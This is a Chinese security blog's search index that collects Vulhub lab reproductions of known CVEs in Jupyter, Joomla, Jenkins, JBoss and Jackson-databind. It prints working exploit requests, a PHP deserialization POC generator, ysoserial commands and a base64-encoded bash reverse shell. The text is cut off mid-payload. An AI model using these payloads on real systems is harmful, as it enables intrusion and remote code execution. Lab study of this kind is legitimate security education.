<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>其他更多文章</title>
    <url>/2020/07/07/%E5%85%B6%E4%BB%96%E6%9B%B4%E5%A4%9A%E6%96%87%E7%AB%A0/</url>
    <content><![CDATA[<p>​    之前写的文章主要是 靶机、CTF、域渗透、少许实战等，都比较基础。觉得有兴趣的可以看看，提一提错误。</p>
<p><img src="https://image.3001.net/images/20200710/15943670902352.png" alt="img"></p>
<a id="more"></a>

<p>joker0xxx3 博客园：<a href="https://www.cnblogs.com/joker-vip/" target="_blank" rel="noopener">https://www.cnblogs.com/joker-vip/</a></p>
]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>其它</tag>
      </tags>
  </entry>
  <entry>
    <title>Jupyter Notebook 未授权访问漏洞</title>
    <url>/2021/08/23/Jupyter%20Notebook%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="Jupyter-Notebook-未授权访问漏洞"><a href="#Jupyter-Notebook-未授权访问漏洞" class="headerlink" title="Jupyter Notebook 未授权访问漏洞"></a>Jupyter Notebook 未授权访问漏洞</h1><p>Jupyter Notebook（此前被称为 IPython notebook）是一个交互式笔记本，支持运行 40 多种编程语言。</p>
<p>如果管理员未为Jupyter Notebook配置密码，将导致未授权访问漏洞，游客可在其中创建一个console并执行任意Python代码和命令。</p>
<a id="more"></a>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>运行后，访问<code>http://192.168.44.132:8888</code>将看到Jupyter Notebook的Web管理界面，并没有要求填写密码。</p>
<p>选择 new -&gt; terminal 即可创建一个控制台：</p>
<p><img src="https://image.3001.net/images/20210824/1629802925600.png" alt="image-20210824172359802"></p>
<p>直接执行任意命令：</p>
<p><img src="https://image.3001.net/images/20210824/16298029283836.png" alt="image-20210824172420290"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>Jupyter</tag>
      </tags>
  </entry>
  <entry>
    <title>Joomla 3.7.0 (CVE-2017-8917) SQL注入漏洞</title>
    <url>/2021/08/23/Joomla%203.7.0%20(CVE-2017-8917)%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="Joomla-3-7-0-CVE-2017-8917-SQL注入漏洞"><a href="#Joomla-3-7-0-CVE-2017-8917-SQL注入漏洞" class="headerlink" title="Joomla 3.7.0 (CVE-2017-8917) SQL注入漏洞"></a>Joomla 3.7.0 (CVE-2017-8917) SQL注入漏洞</h1><p>com_fields组件出现漏洞，com_fields组件是在3.7版本添加的，如果你使用此版本，将受到影响，并应尽快更新。这个组件可以公开访问，意味着任何能访问你站点的用户都可以发起攻击。</p>
<p>Joomla于5月17日发布了新版本3.7.1,（<a href="https://www.joomla.org/announcements/release-news/5705-joomla-3-7-1-release.html），本次更新中修复一个高危SQL注入漏洞（https://developer.joomla.org/security-centre/692-20170501-core-sql-injection.html），成功利用该漏洞后攻击者可以在未授权的情况下进行SQL注入。" target="_blank" rel="noopener">https://www.joomla.org/announcements/release-news/5705-joomla-3-7-1-release.html），本次更新中修复一个高危SQL注入漏洞（https://developer.joomla.org/security-centre/692-20170501-core-sql-injection.html），成功利用该漏洞后攻击者可以在未授权的情况下进行SQL注入。</a></p>
<a id="more"></a>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>启动后访问<code>http://192.168.44.132:8080</code>即可看到Joomla的安装界面，当前环境的数据库信息为：</p>
<ul>
<li>数据库地址：mysql:3306</li>
<li>用户：root</li>
<li>密码：root</li>
<li>数据库名：joomla</li>
</ul>
<p>填入上述信息，正常安装即可。</p>
<p>安装完成后，访问<code>http://192.168.44.132:8080/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,user()),1)</code>，即可看到报错信息：</p>
<p><img src="https://image.3001.net/images/20210824/16297960491373.png" alt="image-20210824165806908"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>Joomla</tag>
      </tags>
  </entry>
  <entry>
    <title>Joomla 3.4.5 反序列化漏洞（CVE-2015-8562）</title>
    <url>/2021/08/23/Joomla%203.4.5%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2015-8562%EF%BC%89/</url>
    <content><![CDATA[<h1 id="Joomla-3-4-5-反序列化漏洞（CVE-2015-8562）"><a href="#Joomla-3-4-5-反序列化漏洞（CVE-2015-8562）" class="headerlink" title="Joomla 3.4.5 反序列化漏洞（CVE-2015-8562）"></a>Joomla 3.4.5 反序列化漏洞（CVE-2015-8562）</h1><p>本漏洞根源是PHP5.6.13前的版本在读取存储好的session时，如果反序列化出错则会跳过当前一段数据而去反序列化下一段数据。而Joomla将session存储在Mysql数据库中，编码是utf8，当我们插入4字节的utf8数据时则会导致截断。截断后的数据在反序列化时就会失败，最后触发反序列化漏洞。</p>
<p>通过Joomla中的Gadget，可造成任意代码执行的结果。</p>
<p>详情可参考：</p>
<ul>
<li><a href="https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html</a></li>
</ul>
<p>影响版本</p>
<ul>
<li>Joomla 1.5.x, 2.x, and 3.x before 3.4.6</li>
<li>PHP 5.6 &lt; 5.6.13, PHP 5.5 &lt; 5.5.29 and PHP 5.4 &lt; 5.4.45</li>
</ul>
<a id="more"></a>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>启动后访问<code>http://192.168.44.132:8080/</code>即可看到Joomla的安装界面，当前环境的数据库信息为：</p>
<ul>
<li>数据库地址：mysql:3306</li>
<li>用户：root</li>
<li>密码：root</li>
<li>数据库名：joomla</li>
</ul>
<p>填入上述信息，正常安装即可。</p>
<p>然后我们不带User-Agent头，先访问一次目标主页，记下服务端返回的Cookie：</p>
<p><img src="https://image.3001.net/images/20210824/1629796001762.png" alt="image-20210824151032614"></p>
<p>再用如下脚本生成POC：（<a href="http://sandbox.onlinephpfunctions.com/code/17e7080841ccce12f6c6e0bb1de01b9e390510bd" target="_blank" rel="noopener">在线运行</a>）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JSimplepieFactory</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JDatabaseDriverMysql</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimplePie</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $sanitize;</span><br><span class="line">    <span class="keyword">var</span> $cache;</span><br><span class="line">    <span class="keyword">var</span> $cache_name_function;</span><br><span class="line">    <span class="keyword">var</span> $javascript;</span><br><span class="line">    <span class="keyword">var</span> $feed_url;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;feed_url = <span class="string">"phpinfo();JFactory::getConfig();exit;"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;javascript = <span class="number">9999</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cache_name_function = <span class="string">"assert"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sanitize = <span class="keyword">new</span> JDatabaseDriverMysql();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cache = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JDatabaseDriverMysqli</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $a;</span><br><span class="line">    <span class="keyword">protected</span> $disconnectHandlers;</span><br><span class="line">    <span class="keyword">protected</span> $connection;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="keyword">new</span> JSimplepieFactory();</span><br><span class="line">        $x = <span class="keyword">new</span> SimplePie();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;connection = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;disconnectHandlers = [</span><br><span class="line">            [$x, <span class="string">"init"</span>],</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> JDatabaseDriverMysqli();</span><br><span class="line">$poc = serialize($a); </span><br><span class="line"></span><br><span class="line">$poc = str_replace(<span class="string">"\x00*\x00"</span>, <span class="string">'\\0\\0\\0'</span>, $poc);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"123&#125;__test|&#123;$poc&#125;\xF0\x9D\x8C\x86"</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210824/16297960053101.png" alt="image-20210824154725611"></p>
<p>将生成好的POC作为User-Agent，带上第一步获取的Cookie发包，这一次发包，脏数据进入Mysql数据库。然后同样的包再发一次，我们的代码被执行：</p>
<p><img src="https://image.3001.net/images/20210824/16297960086572.png" alt="image-20210824154736588"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>Joomla</tag>
      </tags>
  </entry>
  <entry>
    <title>Jenkins-CI 远程代码执行漏洞（CVE-2017-1000353）</title>
    <url>/2021/08/23/Jenkins-CI%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-1000353%EF%BC%89/</url>
    <content><![CDATA[<h1 id="Jenkins-CI-远程代码执行漏洞（CVE-2017-1000353）"><a href="#Jenkins-CI-远程代码执行漏洞（CVE-2017-1000353）" class="headerlink" title="Jenkins-CI 远程代码执行漏洞（CVE-2017-1000353）"></a>Jenkins-CI 远程代码执行漏洞（CVE-2017-1000353）</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>参考阅读 <a href="https://blogs.securiteam.com/index.php/archives/3171" target="_blank" rel="noopener">https://blogs.securiteam.com/index.php/archives/3171</a></p>
<a id="more"></a>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>等待完全启动成功后，访问<code>http://192.168.44.132:8080</code>即可看到jenkins已成功运行，无需手工安装。</p>
<h3 id="步骤一、生成序列化字符串"><a href="#步骤一、生成序列化字符串" class="headerlink" title="步骤一、生成序列化字符串"></a>步骤一、生成序列化字符串</h3><p>参考<a href="https://github.com/vulhub/CVE-2017-1000353，首先下载[CVE-2017-1000353-1.1-SNAPSHOT-all.jar](https://github.com/vulhub/CVE-2017-1000353/releases/download/1.1/CVE-2017-1000353-1.1-SNAPSHOT-all.jar)，这是生成POC的工具。" target="_blank" rel="noopener">https://github.com/vulhub/CVE-2017-1000353，首先下载[CVE-2017-1000353-1.1-SNAPSHOT-all.jar](https://github.com/vulhub/CVE-2017-1000353/releases/download/1.1/CVE-2017-1000353-1.1-SNAPSHOT-all.jar)，这是生成POC的工具。</a></p>
<p>执行下面命令，生成字节码文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser <span class="string">"touch /tmp/success"</span></span><br><span class="line"><span class="comment"># jenkins_poc.ser是生成的字节码文件名</span></span><br><span class="line"><span class="comment"># "touch ..."是待执行的任意命令</span></span><br></pre></td></tr></table></figure>

<p>执行上述代码后，生成jenkins_poc.ser文件，这就是序列化字符串。</p>
<p>下载<a href="https://github.com/vulhub/CVE-2017-1000353/blob/master/exploit.py" target="_blank" rel="noopener">exploit.py</a>，python3执行<code>python exploit.py http://192.168.44.132:8080 jenkins_poc.ser</code>，将刚才生成的字节码文件发送给目标：</p>
<p><img src="https://image.3001.net/images/20210824/16297708322462.png" alt="image-20210823172745321"></p>
<p>进入docker，发现<code>/tmp/success</code>成功被创建，说明命令执行漏洞利用成功：</p>
<p><img src="https://image.3001.net/images/20210824/16297708356471.png" alt="image-20210823172659233"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>Jenkins</tag>
      </tags>
  </entry>
  <entry>
    <title>Jenkins远程命令执行漏洞（CVE-2018-1000861）</title>
    <url>/2021/08/23/Jenkins%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-1000861%EF%BC%89/</url>
    <content><![CDATA[<h1 id="Jenkins远程命令执行漏洞（CVE-2018-1000861）"><a href="#Jenkins远程命令执行漏洞（CVE-2018-1000861）" class="headerlink" title="Jenkins远程命令执行漏洞（CVE-2018-1000861）"></a>Jenkins远程命令执行漏洞（CVE-2018-1000861）</h1><p>Jenkins使用Stapler框架开发，其允许用户通过URL PATH来调用一次public方法。由于这个过程没有做限制，攻击者可以构造一些特殊的PATH来执行一些敏感的Java方法。</p>
<p>通过这个漏洞，我们可以找到很多可供利用的利用链。其中最严重的就是绕过Groovy沙盒导致未授权用户可执行任意命令：Jenkins在沙盒中执行Groovy前会先检查脚本是否有错误，检查操作是没有沙盒的，攻击者可以通过Meta-Programming的方式，在检查这个步骤时执行任意命令。</p>
<p>参考链接：</p>
<ul>
<li><a href="http://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html" target="_blank" rel="noopener">http://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html</a></li>
<li><a href="http://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html" target="_blank" rel="noopener">http://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html</a></li>
<li><a href="https://0xdf.gitlab.io/2019/02/27/playing-with-jenkins-rce-vulnerability.html" target="_blank" rel="noopener">https://0xdf.gitlab.io/2019/02/27/playing-with-jenkins-rce-vulnerability.html</a></li>
</ul>
<a id="more"></a>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，访问<code>http://192.168.44.132:8080</code>即可看到一个已经成功初始化的Jenkins，无需再进行任何操作。</p>
<p>使用 @orangetw 给出的<a href="https://github.com/orangetw/awesome-jenkins-rce-2019" target="_blank" rel="noopener">一键化POC脚本</a>，发送如下请求即可成功执行命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.44.132:8080&#x2F;securityRealm&#x2F;user&#x2F;admin&#x2F;descriptorByName&#x2F;org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript&#x2F;checkScript</span><br><span class="line">?sandbox&#x3D;true</span><br><span class="line">&amp;value&#x3D;public class x &#123;</span><br><span class="line">  public x()&#123;</span><br><span class="line">    &quot;touch &#x2F;tmp&#x2F;success&quot;.execute()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210824/16297709021992.png" alt="image-20210823180547451"></p>
<p><code>/tmp/success</code>已成功创建：</p>
<p><img src="https://image.3001.net/images/20210824/1629770905268.png" alt="image-20210823180601259"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>Jenkins</tag>
      </tags>
  </entry>
  <entry>
    <title>JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）</title>
    <url>/2021/08/23/JBoss%204.x%20JBossMQ%20JMS%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-7504%EF%BC%89/</url>
    <content><![CDATA[<h1 id="JBoss-4-x-JBossMQ-JMS-反序列化漏洞（CVE-2017-7504）"><a href="#JBoss-4-x-JBossMQ-JMS-反序列化漏洞（CVE-2017-7504）" class="headerlink" title="JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）"></a>JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）</h1><p>Red Hat JBoss Application Server 是一款基于JavaEE的开源应用服务器。JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。</p>
<p>参考：</p>
<ul>
<li><a href="https://github.com/joaomatosf/JavaDeserH2HC" target="_blank" rel="noopener">https://github.com/joaomatosf/JavaDeserH2HC</a></li>
<li><a href="https://www.youtube.com/watch?v=jVMr4eeJ2Po" target="_blank" rel="noopener">https://www.youtube.com/watch?v=jVMr4eeJ2Po</a></li>
</ul>
<a id="more"></a>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，目标为<code>http://192.168.44.132:8080</code>。</p>
<p>该漏洞出现在<code>/jbossmq-httpil/HTTPServerILServlet</code>请求中，我们借助ysoserial的eCommonsCollections5利用链来复现。生成Payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-master-30099844c6-1.jar CommonsCollections5 &quot;touch &#x2F;tmp&#x2F;success&quot; &gt; 1.ser</span><br></pre></td></tr></table></figure>

<p>我们将1.ser文件内容作为POST Body发送：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;192.168.44.132:8080&#x2F;jbossmq-httpil&#x2F;HTTPServerILServlet --data-binary @1.ser</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210823/16297093071661.png" alt="image-20210823164704600"></p>
<p>执行<code>docker-compose exec jboss bash</code>进入容器，可见<code>/tmp/success</code>已成功创建。</p>
<p><img src="https://image.3001.net/images/20210823/16297093162750.png" alt="image-20210823164636884"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>JBoss</tag>
      </tags>
  </entry>
  <entry>
    <title>JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）</title>
    <url>/2021/08/17/JBoss%205.x6.x%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12149%EF%BC%89/</url>
    <content><![CDATA[<h1 id="JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）"><a href="#JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）" class="headerlink" title="JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）"></a>JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）</h1><p>该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。</p>
<p>参考：</p>
<ul>
<li><a href="https://mp.weixin.qq.com/s/zUJMt9hdGoz1TEOKy2Cgdg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/zUJMt9hdGoz1TEOKy2Cgdg</a></li>
<li><a href="https://access.redhat.com/security/cve/cve-2017-12149" target="_blank" rel="noopener">https://access.redhat.com/security/cve/cve-2017-12149</a></li>
</ul>
<a id="more"></a>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首次执行时会有1~3分钟时间初始化，初始化完成后访问<code>http://192.168.44.132:8080/</code>即可看到JBoss默认页面。</p>
<p>该漏洞出现在<code>/invoker/readonly</code>请求中，服务器将用户提交的POST内容进行了Java反序列化：</p>
<p><img src="https://image.3001.net/images/20210818/16292507206067.png" alt="image-20210817172221375"></p>
<p>所以，我们用常规Java反序列化漏洞测试方法来复现该漏洞。</p>
<p>我们使用bash来反弹shell，但由于<code>Runtime.getRuntime().exec()</code>中不能使用管道符等bash需要的方法，我们需要用进行一次编码。</p>
<p>工具：<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
<p>使用<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a>来复现生成序列化数据，由于Vulhub使用的Java版本较新，所以选择使用的gadget是CommonsCollections5：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ0LjEzMi80NDQ0IDA+JjE&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; poc.ser</span><br></pre></td></tr></table></figure>

<p>生成好的POC即为poc.ser，将这个文件作为POST Body发送至/invoker/readonly即可：</p>
<p><img src="https://image.3001.net/images/20210818/1629250724562.png" alt="image-20210817173505127"></p>
<p>成功反弹shell：</p>
<p><img src="https://image.3001.net/images/20210818/16292507285446.png" alt="image-20210817173521264"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>JBoss</tag>
      </tags>
  </entry>
  <entry>
    <title>JBoss JMXInvokerServlet 反序列化漏洞</title>
    <url>/2021/08/17/JBoss%20JMXInvokerServlet%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="JBoss-JMXInvokerServlet-反序列化漏洞"><a href="#JBoss-JMXInvokerServlet-反序列化漏洞" class="headerlink" title="JBoss JMXInvokerServlet 反序列化漏洞"></a>JBoss JMXInvokerServlet 反序列化漏洞</h1><p>这是经典的JBoss反序列化漏洞，JBoss在<code>/invoker/JMXInvokerServlet</code>请求中读取了用户传入的对象，然后我们利用Apache Commons Collections中的Gadget执行任意代码。</p>
<p>参考文档：</p>
<ul>
<li><a href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/" target="_blank" rel="noopener">https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/</a></li>
<li><a href="https://www.seebug.org/vuldb/ssvid-89723" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-89723</a></li>
<li><a href="http://www.freebuf.com/sectool/88908.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/88908.html</a></li>
<li><a href="https://paper.seebug.org/312/" target="_blank" rel="noopener">https://paper.seebug.org/312/</a></li>
</ul>
<a id="more"></a>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首次执行时会有1~3分钟时间初始化，初始化完成后访问<code>http://192.168.44.132:8080/</code>即可看到JBoss默认页面。</p>
<p>JBoss在处理<code>/invoker/JMXInvokerServlet</code>请求的时候读取了对象，所以我们直接将<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a>生成好的POC附在POST Body中发送即可。整个过程可参考<a href="https://github.com/vulhub/vulhub/tree/master/jboss/CVE-2017-12149" target="_blank" rel="noopener">jboss/CVE-2017-12149</a>，我就不再赘述。</p>
<p>网上已经有很多EXP了，比如<a href="https://cdn.vulhub.org/deserialization/DeserializeExploit.jar" target="_blank" rel="noopener">DeserializeExploit.jar</a>，直接用该工具执行命令、上传文件即可：</p>
<p><img src="https://image.3001.net/images/20210818/16292506982325.png" alt="image-20210817162514937"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>JBoss</tag>
      </tags>
  </entry>
  <entry>
    <title>Jackson-databind 反序列化漏洞（CVE-2017-7525）</title>
    <url>/2021/08/16/Jackson-databind%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-7525%EF%BC%89/</url>
    <content><![CDATA[<h1 id="Jackson-databind-反序列化漏洞（CVE-2017-7525）"><a href="#Jackson-databind-反序列化漏洞（CVE-2017-7525）" class="headerlink" title="Jackson-databind 反序列化漏洞（CVE-2017-7525）"></a>Jackson-databind 反序列化漏洞（CVE-2017-7525）</h1><p>Jackson-databind 支持 <a href="https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization" target="_blank" rel="noopener">Polymorphic Deserialization</a> 特性（默认情况下不开启），当 json 字符串转换的 Target class 中有 polymorph fields，即字段类型为接口、抽象类或 Object 类型时，攻击者可以通过在 json 字符串中指定变量的具体类型 (子类或接口实现类)，来实现实例化指定的类，借助某些特殊的 class，如 <code>TemplatesImpl</code>，可以实现任意代码执行。</p>
<p>所以，本漏洞利用条件如下：</p>
<ul>
<li><p>开启 JacksonPolymorphicDeserialization，即调用以下任意方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">objectMapper.enableDefaultTyping(); <span class="comment">// default to using DefaultTyping.OBJECT_AND_NON_CONCRETE</span></span><br><span class="line">objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);</span><br></pre></td></tr></table></figure>
</li>
<li><p>Target class 需要有无参 constructor</p>
</li>
<li><p>Target class 中需要需要有字段类型为 Interface、abstract class、Object，并且使用的 Gadget 需要为其子类 / 实现接口</p>
</li>
</ul>
<h3 id="CVE-2017-7525"><a href="#CVE-2017-7525" class="headerlink" title="CVE-2017-7525"></a>CVE-2017-7525</h3><p><code>Jackson-databind</code> 在设置 Target class 成员变量参数值时，若没有对应的 getter 方法，则会使用 <code>SetterlessProperty</code> 调用 getter 方法，获取变量，然后设置变量值。当调用 <code>getOutputProperties()</code> 方法时，会初始化 <code>transletBytecodes</code> 包含字节码的类，导致命令执行，具体可参考 <a href="https://b1ngz.github.io/java-deserialization-jdk7u21-gadget-note/" target="_blank" rel="noopener">java-deserialization-jdk7u21-gadget-note</a> 中关于 <code>TemplatesImpl</code> 的说明。</p>
<p>使用JDK7u21的<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>作为Gadget，发送如下请求，将会执行<code>touch /tmp/prove1.txt</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;exploit HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 1298</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;param&quot;: [</span><br><span class="line">    &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;transletBytecodes&quot;: [</span><br><span class="line">  &quot;yv66vgAAADMAKAoABAAUCQADABUHABYHABcBAAVwYXJhbQEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAcTGNvbS9iMW5nei9zZWMvbW9kZWwvVGFyZ2V0OwEACGdldFBhcmFtAQAUKClMamF2YS9sYW5nL09iamVjdDsBAAhzZXRQYXJhbQEAFShMamF2YS9sYW5nL09iamVjdDspVgEAClNvdXJjZUZpbGUBAAtUYXJnZXQuamF2YQwABwAIDAAFAAYBABpjb20vYjFuZ3ovc2VjL21vZGVsL1RhcmdldAEAEGphdmEvbGFuZy9PYmplY3QBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAZAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAGwAcCgAaAB0BABV0b3VjaCAvdG1wL3Byb3ZlMS50eHQIAB8BAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAhACIKABoAIwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHACUKACYAFAAhAAMAJgAAAAEAAgAFAAYAAAAEAAEABwAIAAEACQAAAC8AAQABAAAABSq3ACexAAAAAgAKAAAABgABAAAABgALAAAADAABAAAABQAMAA0AAAABAA4ADwABAAkAAAAvAAEAAQAAAAUqtAACsAAAAAIACgAAAAYAAQAAAAoACwAAAAwAAQAAAAUADAANAAAAAQAQABEAAQAJAAAAPgACAAIAAAAGKiu1AAKxAAAAAgAKAAAACgACAAAADgAFAA8ACwAAABYAAgAAAAYADAANAAAAAAAGAAUABgABAAgAGAAIAAEACQAAABYAAgAAAAAACrgAHhIgtgAkV7EAAAAAAAEAEgAAAAIAEw&#x3D